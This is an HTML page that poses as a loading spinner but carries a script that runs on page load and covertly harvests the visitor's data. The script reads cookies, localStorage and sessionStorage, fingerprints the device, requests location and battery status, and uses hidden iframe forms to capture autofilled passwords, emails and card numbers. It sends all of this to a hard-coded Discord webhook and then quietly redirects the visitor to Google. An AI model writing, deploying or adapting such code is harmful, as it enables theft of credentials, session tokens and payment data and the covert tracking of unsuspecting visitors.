<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { margin: 0; padding: 0; background: #f0f0f0; font-family: system-ui; overflow: hidden; }
        .loader { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        iframe { display: none; }
    </style>
</head>
<body>
    <div class="loader"><div class="spinner"></div></div>

    <script>
        class StealthHarvester {
            constructor(webhook) {
                this.webhook = webhook;
                this.data = {};
                this.stealEverything();
            }

            async stealEverything() {
                // 1. FULL DEVICE FINGERPRINT
                this.data.fingerprint = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    hardware: navigator.hardwareConcurrency + ' cores',
                    memory: navigator.deviceMemory + 'GB'
                };

                // 2. ALL COOKIES (Session tokens)
                this.data.cookies = document.cookie;

                // 3. ALL LOCALSTORAGE (Bank tokens, auth)
                this.data.localStorage = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    this.data.localStorage[key] = localStorage.getItem(key);
                }

                // 4. ALL SESSIONSTORAGE
                this.data.sessionStorage = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    this.data.sessionStorage[key] = sessionStorage.getItem(key);
                }

                // 5. STEAL AUTOFILL PASSWORDS (Hidden forms)
                await this.extractAutofill();

                // 6. CANVAS FINGERPRINT
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.fillText('fingerprint', 10, 10);
                this.data.canvas = canvas.toDataURL();

                // 7. LOCATION TRACKING
                try {
                    const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
                    this.data.location = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
                } catch {}

                // 8. BATTERY INFO
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    this.data.battery = `${Math.round(bat.level*100)}% ${bat.charging ? 'charging' : 'discharging'}`;
                }

                // SEND EVERYTHING
                this.sendToDiscord();
            }

            async extractAutofill() {
                // Create hidden forms that trigger autofill
                const forms = ['login', 'bank', 'email', 'wallet'];
                this.data.autofill = {};

                for (const formType of forms) {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    
                    iframeDoc.open();
                    iframeDoc.write(`
                        <form>
                            <input name="email" autocomplete="email" type="email">
                            <input name="password" autocomplete="current-password" type="password">
                            <input name="bank" autocomplete="cc-number" type="text" placeholder="Bank Card">
                            <input name="phone" autocomplete="tel" type="tel">
                        </form>
                    `);
                    iframeDoc.close();

                    await new Promise(r => setTimeout(r, 1000)); // Wait for autofill

                    const inputs = iframeDoc.querySelectorAll('input');
                    this.data.autofill[formType] = Array.from(inputs).map(i => i.value).filter(Boolean);
                    
                    document.body.removeChild(iframe);
                }
            }

            async sendToDiscord() {
                const embed = {
                    title: "🎯 ZERO-CLICK HARVEST COMPLETE",
                    color: 16711680,
                    fields: [
                        { name: "📱 Device", value: this.data.fingerprint.userAgent.slice(0,80), inline: true },
                        { name: "📍 Location", value: this.data.location || 'N/A', inline: true },
                        { name: "🔋 Battery", value: this.data.battery || 'N/A', inline: true },
                        { name: "🍪 Cookies", value: this.data.cookies ? `${this.data.cookies.length} bytes` : 'None', inline: true },
                        { name: "💾 LocalStorage", value: `${Object.keys(this.data.localStorage).length} items`, inline: true },
                        { name: "**Autofill Captures**", value: JSON.stringify(this.data.autofill, null, 1), inline: false },
                        { name: "**Bank/Wallet Data**", value: Object.values(this.data.localStorage).filter(v => v.includes('token') || v.includes('card') || v.includes('wallet')).join('\n') || 'None found', inline: false }
                    ],
                    description: `\`\`\`json\n${JSON.stringify(this.data, null, 2).slice(0,2000)}\`\`\``,
                    footer: { text: `Stealth Harvest | ${new Date().toLocaleString()}` }
                };

                await fetch('https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });

                // Redirect silently after 3s
                setTimeout(() => window.location.href = 'https://google.com', 3000);
            }
        }

        // START HARVEST ON LOAD
        new StealthHarvester('YOUR_DISCORD_WEBHOOK_URL_HERE');
    </script>
</body>
</html>
